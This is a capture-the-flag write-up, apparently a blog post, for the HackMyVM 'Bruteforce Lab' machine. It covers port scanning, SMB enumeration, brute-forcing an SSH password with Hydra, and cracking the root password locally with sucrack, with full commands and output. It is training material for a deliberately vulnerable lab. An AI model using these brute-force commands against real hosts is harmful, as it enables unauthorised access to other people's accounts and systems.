---
layout: post
title: "HackMyVM - Bruteforce Lab"
date: 2023-04-06 23:56:33 +0100
categories: hmv
---
# HackMyVM > Bruteforce Lab

Creator: [terminal](https://hackmyvm.eu/profile/?user=terminal)
Level: Easy
Release Date: 2023-04-05

## Scan

```bash
$ nmap -sV -sC -oA scans/BruteforceLab -p- $IP           
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-06 23:56 WEST
Nmap scan report for 192.168.1.155
Host is up (0.00036s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 1cdbf89272c472dc24c3ca7c80ebf481 (RSA)
|   256 7f3033e2f40d87415ea324de57c6738b (ECDSA)
|_  256 9a9e2f53e02bb4983f3495535687a476 (ED25519)
10000/tcp open  http        MiniServ 2.021 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
19000/tcp open  netbios-ssn Samba smbd 4.6.2
19222/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.20 seconds
```

### SMB

```bash
$ smbclient -U Test \\\\LAB-Bruteforce\\Test\\ -p 19000 
Password for [WORKGROUP\Test]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Mar 26 20:06:46 2023
  ..                                  D        0  Sun Mar 26 19:12:02 2023
  README.txt                          N      115  Sun Mar 26 20:06:46 2023

                9232860 blocks of size 1024. 3036564 blocks available
smb: \> get README.txt 
getting file \README.txt of size 115 as README.txt (14.0 KiloBytes/sec) (average 14.0 KiloBytes/sec)
smb: \> exit

$ cat README.txt    
Hey Andrea listen to me, I'm going to take a break. I think I've setup this prototype for the SMB server correctly
```

## Cracking SSH (andrea)

```bash
$ hydra  -l andrea -P /usr/share/wordlists/rockyou.txt 192.168.1.155 ssh                                                                              
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-07 16:53:13
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.1.155:22/
[STATUS] 116.00 tries/min, 116 tries in 00:01h, 14344285 to do in 2060:58h, 14 active
[STATUS] 98.67 tries/min, 296 tries in 00:03h, 14344105 to do in 2422:60h, 14 active
[STATUS] 92.29 tries/min, 646 tries in 00:07h, 14343755 to do in 2590:28h, 14 active
[22][ssh] host: 192.168.1.155   login: andrea   password: a*****e
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-07 17:02:55
```

## SSH 

```bash
$ ssh andrea@192.168.1.155                 
andrea@192.168.1.155's password: 
Linux LAB-Bruteforce 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
Last login: Sat Apr  8 19:51:25 2023 from 192.168.1.6

andrea@LAB-Bruteforce:~$ ls -la
total 812
drwxr-xr-x 6 andrea andrea   4096 Apr  8 19:42 .
drwxr-xr-x 4 root   root     4096 Mar 26 20:12 ..
-rw------- 1 andrea andrea   2726 Apr  8 00:18 .bash_history
-rw-r--r-- 1 andrea andrea    220 Mar 26 20:12 .bash_logout
-rw-r--r-- 1 andrea andrea   3526 Mar 26 20:12 .bashrc
drwxr-xr-x 4 andrea andrea   4096 Mar 26 21:13 .cache
drwxr-xr-x 5 andrea andrea   4096 Mar 26 21:13 .config
drwx------ 3 andrea andrea   4096 Apr  8 19:46 .gnupg
drwxr-xr-x 3 andrea andrea   4096 Mar 26 20:40 .local
-rw-r--r-- 1 andrea andrea    807 Mar 26 20:12 .profile
-rw-r--r-- 1 andrea andrea     66 Apr  7 22:31 .selected_editor
-rw-r--r-- 1 andrea andrea    259 Apr  8 00:05 .wget-hsts
-rw-r--r-- 1 andrea andrea     33 Mar 26 20:44 user.txt
andrea@LAB-Bruteforce:~$ 
```


## [Cracking ROOT with SUCrack](https://github.com/hemp3l/sucrack)

```bash
unzip master.zip 
cd sucrack-master/
./configure --enable-statistics --with-static-buffer
make --with-static-buffer --enable-statistics
make
```

```bash
./sucrack -w 256 -u root ./xato-net-10-million-passwords-10000.txt 
password is: 1998
```

## ROOT

```bash
andrea@LAB-Bruteforce:~$ su - 
Password: 
root@LAB-Bruteforce:~# id
uid=0(root) gid=0(root) groups=0(root)
```

